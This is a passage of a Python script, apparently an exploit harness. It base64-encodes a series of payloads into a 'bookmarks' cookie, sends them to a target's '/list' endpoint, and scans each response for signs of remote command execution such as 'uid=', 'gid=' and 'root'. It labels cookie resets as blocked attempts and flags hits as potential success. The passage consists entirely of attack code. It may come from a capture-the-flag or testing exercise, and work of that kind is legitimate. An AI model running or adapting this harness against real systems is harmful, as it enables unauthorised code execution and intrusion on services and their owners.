        encoded = base64.b64encode(payload.encode()).decode()
        
        # Set cookies
        cookies = {
            'user': 'f99d00962aa7465fa151128d2318d75d',
            'bookmarks': encoded
        }
        
        # Test against main endpoint
        response = session.get(f"{TARGET}/list", cookies=cookies, timeout=10)
        
        # Analyze response
        result = {
            'name': name,
            'payload': payload[:100] + "..." if len(payload) > 100 else payload,
            'status': response.status_code,
            'size': len(response.text),
            'cookie_reset': 'W10K' in response.text or 'W10K' in str(response.cookies.get('bookmarks', ''))
        }
        results.append(result)
        
        # Check for success indicators
        success_indicators = [
            'uid=' in response.text.lower(),
            'root' in response.text.lower(),
            'gid=' in response.text.lower(),
            'command not found' not in response.text.lower(),
            'error' not in response.text.lower() and response.status_code == 200
        ]
        
        print(f"[{i}/{len(payloads)}] {name}")
        print(f"  Status: {response.status_code} | Size: {len(response.text)}B")
        print(f"  Cookie reset (W10K): {result['cookie_reset']}")
        
        if result['cookie_reset']:
            print(f"  [BLOCKED] - Payload detected and removed")
        elif response.status_code == 500:
            print(f"  [ERROR] - Server error (may indicate partial processing)")
            print(f"  Response snippet: {response.text[:200]}")
        elif any(success_indicators[:3]):
            print(f"  [!] POTENTIAL SUCCESS - Found command output indicators")
            print(f"  Response: {response.text[:500]}")
        else:
            print(f"  [PASS] - Rendered normally")
        
        print("-" * 40)
        
    except Exception as e:
        print(f"[{i}/{len(payloads)}] {name} - EXCEPTION: {str(e)}")
        results.append({'name': name, 'error': str(e)})
        print("-" * 40)

